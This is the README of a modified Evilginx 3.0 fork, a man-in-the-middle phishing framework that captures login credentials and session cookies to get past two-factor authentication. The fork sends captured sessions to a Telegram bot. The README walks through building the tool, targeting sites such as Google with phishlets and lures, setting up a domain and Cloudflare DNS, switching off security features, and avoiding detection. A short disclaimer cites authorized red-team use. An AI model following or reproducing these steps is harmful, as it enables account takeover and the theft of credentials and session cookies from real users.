# Evilginx 3.0
```
- git clone https://github.com/larryomakh/evilginx_modified_telegram_notifications.git
- cd evilginx_modified_telegram_notifications
- ./evilginx2 # and exit
- nano /root/.evilginx/config.json ## add chatid and teletoken and save and exit
- ./evilginx2
```

---

## 📄 Example: /root/.evilginx/config.json

Before starting Evilginx, you must create a config file with your Telegram notification credentials. Open the file with:
```sh
nano /root/.evilginx/config.json
```
Paste and edit the following template:
```json
{
  "chatid": "YOUR_TELEGRAM_CHAT_ID",
  "teletoken": "YOUR_TELEGRAM_BOT_TOKEN"
}
```
- `chatid`: Your Telegram chat ID (where notifications will be sent).
- `teletoken`: Your Telegram bot token (from BotFather).

Save and exit. Now you can launch Evilginx:
```sh
./evilginx2
```

---

## 🖥️ Deploying on Ubuntu Server

**1. Clone the repository:**
```sh
git clone https://github.com/larryomakh/evilginx_modified_telegram_notifications.git
cd evilginx_modified_telegram_notifications
```

**2. Make sure Go 1.22+ is installed:**
```sh
go version  # Should show go1.22.x or newer
```
If you see an older version, upgrade Go:
```sh
rm -rf /usr/local/go
wget https://go.dev/dl/go1.22.0.linux-amd64.tar.gz
tar -C /usr/local -xzf go1.22.0.linux-amd64.tar.gz
export PATH=/usr/local/go/bin:$PATH
echo 'export PATH=/usr/local/go/bin:$PATH' >> ~/.profile
source ~/.profile
go version
```

**3. Build and run Evilginx:**
```sh
go build -o evilginx2 .
./evilginx2
```

---

### 🛠️ Go Build Troubleshooting (Ubuntu)
If you see errors like:
- `cannot load io/fs: malformed module path "io/fs": missing dot in first path element`
- `inconsistent vendoring` or messages about vendor/modules.txt

**You are likely using an old Go version, or the Go modules are out of sync.**

**Fix:**
1. **Ensure you are using Go 1.22 or newer:**
   ```sh
   go version  # Should show go1.22.x or newer
   ```
2. **If you see vendoring errors after cloning or moving the repo:**
   ```sh
   go mod tidy
   go mod vendor
   go build -o evilginx2 .
   ./evilginx2
   ```

This will resolve version and vendoring issues on fresh installations or after moving the project between machines.

**4. Running in the background:**
```sh
nohup ./evilginx2 > evilginx2.log 2>&1 &
```

---

## ⚠️ TLS Certificate Troubleshooting
If you see this error:
```
[!!!] certdb: tls: private key does not match public key
```
- Evilginx is trying to load a mismatched TLS certificate and private key from `/root/.evilginx`.
- To fix, delete the files in `/root/.evilginx` and restart Evilginx:
```sh
rm -rf /root/.evilginx/*
./evilginx2
```
- Evilginx will attempt to generate/request new certificates.

---

## 🚫 Managing the Blacklist (Block/Unblock IPs)

**Blacklist file location:** By default, Evilginx loads blacklisted IPs and CIDR masks from a file (often `/root/.evilginx/blacklist.txt` or similar; check logs or config for the exact path).

### ➕ Adding to the Blacklist

**Method 1: Manually edit the blacklist file**
1. Open the blacklist file:
   ```sh
   nano /root/.evilginx/blacklist.txt
   ```
2. Add each IP or CIDR (subnet) on a new line. Examples:
   ```
   123.123.123.123
   10.0.0.0/8
   ```
3. Save and exit.
4. Restart Evilginx for changes to take effect:
   ```sh
   pkill evilginx2
   ./evilginx2
   ```

**Method 2: Programmatically (from Go code)**
- Evilginx uses the `AddIP` method in `core/blacklist.go` to add an IP:
  ```go
  err := blacklist.AddIP("123.123.123.123")
  ```

### ➖ Removing from the Blacklist

1. Open the blacklist file:
   ```sh
   nano /root/.evilginx/blacklist.txt
   ```
2. Delete the line(s) for IPs or subnets you want to remove.
3. Save and exit.
4. Restart Evilginx:
   ```sh
   pkill evilginx2
   ./evilginx2
   ```

### 🔎 Where is the Blacklist File?
- The path is usually displayed in Evilginx logs at startup (look for `loading blacklist from: ...`).
- Common locations: `/root/.evilginx/blacklist.txt`, `blacklist.txt` in the Evilginx directory, or as configured in your setup.

### 📝 Example
To block `8.8.8.8` and the entire `192.168.1.0/24` subnet:
```
8.8.8.8
192.168.1.0/24
```
To unblock, simply remove those lines and restart Evilginx.

---

## ☁️ Evilginx + Cloudflare Integration Guide

### 1. Create a Lure in Evilginx

**A. Start Evilginx**
```sh
./evilginx2
```

**B. List Available Phishlets**
```
> phishlets
```
Pick your target (e.g., `google`, `facebook`, etc.).

**C. Configure the Phishlet Domain**
Suppose you want to phish `google.com` using `login.yourdomain.com`:
```
> phishlets hostname google login.yourdomain.com
```
Repeat for all required hostnames as per the phishlet’s instructions.

**D. Enable the Phishlet**
```
> phishlets enable google
```

**E. Create a Lure**
```
> lures create google
```
Copy the generated lure URL.

---

### 2. Set Up Your Domain with Cloudflare

**A. Register a Domain**
- Buy a domain from a registrar (e.g., Namecheap, GoDaddy).

**B. Add Domain to Cloudflare**
- Go to [Cloudflare](https://dash.cloudflare.com/), create an account, and add your domain.
- Cloudflare will provide you with new nameservers.
- Update your domain registrar’s nameservers to point to Cloudflare’s.

**C. Set Up DNS Records**
- In Cloudflare DNS settings, add an `A` record for each hostname used by your lure.
    - **Name:** `login` (or whatever subdomain your phishlet/lure uses)
    - **Type:** `A`
    - **Content:** Your Evilginx server’s public IP address
    - **Proxy status:** **DNS only** (the orange cloud must be **grey**! Evilginx will not work behind Cloudflare’s proxy)

    Repeat for all subdomains required by the phishlet.

---

### 3. SSL/TLS Settings in Cloudflare

- Go to the SSL/TLS tab in Cloudflare.
- Set SSL/TLS mode to **Full** or **Full (Strict)**.
- **DO NOT** use “Flexible” mode.
- For best results, use your own Let’s Encrypt certificates or let Evilginx handle automatic certificate generation.

---

### 4. Firewall and Security Settings

- Disable Cloudflare’s security features (WAF, Bot Fight Mode, etc.) for your phishing subdomains.
- Go to “Page Rules” or “Rules” and create rules to turn off security features for your lure subdomains.
- Ensure ports 80 and 443 are open on your Evilginx server.

---

### 5. Test Your Setup

- Wait for DNS propagation (can take a few minutes).
- Visit your lure URL (e.g., `https://login.yourdomain.com`).
- Evilginx should serve the phishing page with a valid certificate.

---

### 6. Troubleshooting

- If you see Cloudflare’s error or “SSL handshake failed,” check:
    - The DNS record is set to “DNS only” (grey cloud).
    - Your server’s firewall allows inbound traffic on ports 80 and 443.
    - Evilginx is running and has valid certificates.
- Use `dig` or `nslookup` to confirm your subdomain resolves to your server’s IP.

#### 🔍 Testing DNS and HTTP Connectivity

If you want to confirm that your domain/subdomain correctly points to your server and that port 80 is open:

1. **Check what is using port 80:**
   ```sh
   sudo lsof -i :80
   ```
   If nginx or another web server is running, you may need to stop it:
   ```sh
   sudo systemctl stop nginx
   ```

2. **Run a simple Python HTTP server:**
   ```sh
   python3 -m http.server 80
   ```

3. **From another device, visit:**
   - `http://yourdomain.com` or your phishing subdomain.
   - If you see a directory listing or a 404 error in your Python server logs, your DNS and HTTP are working.

4. **When done, stop the test server and restart Evilginx (or nginx):**
   ```sh
   pkill -f http.server
   ./evilginx2
   # or, to restart nginx
   sudo systemctl start nginx
   ```

**Interpreting Results:**
- If you see external requests in the Python server logs, your DNS is set up correctly and port 80 is open.
- 404 errors are normal if the requested files don’t exist; the important thing is that requests reach your server.

---

### 7. Security Notes

- Never use Cloudflare’s proxy (orange cloud) for Evilginx phishing subdomains.
- Only use Cloudflare for DNS management.
- Using the proxy will break Evilginx’s MITM functionality and may expose you to detection.

---

## 🏃 Keeping Evilginx Running After Closing Terminal

> **Important:** Evilginx requires an interactive shell. Methods like `nohup` or backgrounding with `&` will NOT work reliably—Evilginx will exit immediately because it cannot access a terminal for its interactive REPL.

### ✅ Recommended: Using `screen` or `tmux`
- Start a persistent terminal session:
  ```sh
  screen -S evilginx
  # or
  tmux new -s evilginx
  ```
- Run Evilginx inside the session:
  ```sh
  ./evilginx2
  ```
- Detach from the session (leave Evilginx running):
  - For `screen`: Press `Ctrl+A` then `D`
  - For `tmux`: Press `Ctrl+B` then `D`
- You can safely close your SSH session or terminal.
- To reattach later:
  ```sh
  screen -r evilginx
  # or
  tmux attach -t evilginx
  ```
- If you have multiple `screen` sessions, list them with `screen -ls` and reattach with `screen -r [pid].evilginx`.
- If a session is still attached elsewhere, force detach and reattach with:
  ```sh
  screen -d -r [pid].evilginx
  ```

### ⚠️ Not Recommended: `nohup` or `&`
- Evilginx will exit immediately if run with `nohup` or in the background because it needs a TTY.
- Always use `screen` or `tmux` for long-running Evilginx sessions.

### 3. Using a systemd Service (Advanced)
- For production, you can create a systemd service to manage Evilginx as a background service, but this requires extra configuration to provide a pseudo-terminal.

---

### Example DNS Record

| Type | Name   | Content           | Proxy Status |
|------|--------|-------------------|--------------|
|  A   | login  | 1.2.3.4 (your IP) | DNS only     |

---
Big Thanks to [kgretzky](https://github.com/kgretzky/) for Creating such great tool  
---

**Evilginx** is a man-in-the-middle attack framework used for phishing login credentials along with session cookies, which in turn allows to bypass 2-factor authentication protection.

This tool is a successor to [Evilginx](https://github.com/kgretzky/evilginx), released in 2017, which used a custom version of nginx HTTP server to provide man-in-the-middle functionality to act as a proxy between a browser and phished website.
Present version is fully written in GO as a standalone application, which implements its own HTTP and DNS server, making it extremely easy to set up and use.

<p align="center">
  <img alt="Screenshot" src="https://raw.githubusercontent.com/kgretzky/evilginx2/master/media/img/screen.png" height="320" />
</p>

---
This has been modified to only send valid sessions, no empty logs, and will include the cookies in a randomly named TXT file. 📂✅🍪

![image (4)](https://github.com/user-attachments/assets/a102ecd7-e342-44c4-bff5-3004d16c0df4)
---

## Disclaimer

This tool is provided strictly for educational purposes and authorized security testing (Red Team exercises). It is intended to help defenders understand and mitigate advanced phishing techniques. Evilginx must only be used in legitimate penetration testing engagements, with explicit written consent from all parties involved.
The author does not endorse or condone any unauthorized or illegal use of this tool. Any misuse, including unauthorized phishing or malicious activity, is strictly prohibited and is the sole responsibility of the user.
By using this software, you acknowledge that you are solely liable for any consequences arising from its use and that you are responsible for complying with all applicable laws and regulations.
---
